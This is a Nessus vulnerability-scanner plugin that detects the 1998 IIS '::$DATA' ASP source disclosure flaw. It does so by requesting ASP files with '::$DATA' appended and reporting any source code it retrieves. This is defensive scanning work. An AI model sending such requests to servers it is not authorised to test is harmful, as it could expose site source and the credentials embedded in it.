#%NASL_MIN_LEVEL 70300
#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10362);
  script_version("1.41");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-1999-0278");
  script_bugtraq_id(149);
  script_xref(name:"MSFT", value:"MS98-003");
  script_xref(name:"MSKB", value:"188806");

  script_name(english:"Microsoft IIS ASP::$DATA ASP Source Disclosure");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure flaw.");
  script_set_attribute(attribute:"description", value:
"It is possible to get the source code of a remote ASP script by
appending '::$DATA' to the end of the request.  ASP source code may
contain sensitive information such as logins, passwords and server
information.");
  # https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/1998/ms98-003
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?717a789b");
  script_set_attribute(attribute:"solution", value:
"Apply the hotfixes referenced in the vendor advisory above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"1998/07/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2000/04/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:internet_information_server");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2000-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("find_service1.nasl", "webmirror.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
  script_require_keys("www/ASP");
  script_require_ports("Services/www", 80);

  exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, asp:TRUE);

function check(file)
{
  local_var w, r, report;

  w = http_send_recv3(method:"GET",item:string(file, "::$DATA"), port:port, exit_on_fail:TRUE);
  r = strcat(w[0], w[1], '\r\n', w[2]);
  if(
    "Content-Type: application/octet-stream" >< r && 
    "<%" >< r && 
    "Bad Request" >!< r 
  )
  {
    if (report_verbosity > 0)
    {
      report = 
        '\n' + "Nessus was able to retrieve the source of '" + file + "' by sending" +
        '\nthe following request :' +
        '\n' +
        '\n  ' + build_url(port:port, qs:file+'::$DATA') + '\n';

      if (report_verbosity > 1)
      {
        report += 
          '\nHere it is :' +
          '\n' +
          '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
          '\n' + w[2] +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    return(1);
  }
  return(0);
}


if(check(file:"/default.asp"))exit(0);
files = get_kb_list(string("www/", port, "/content/extensions/asp"));
if(isnull(files))exit(0);
files = make_list(files);
check(file:files[0]); 
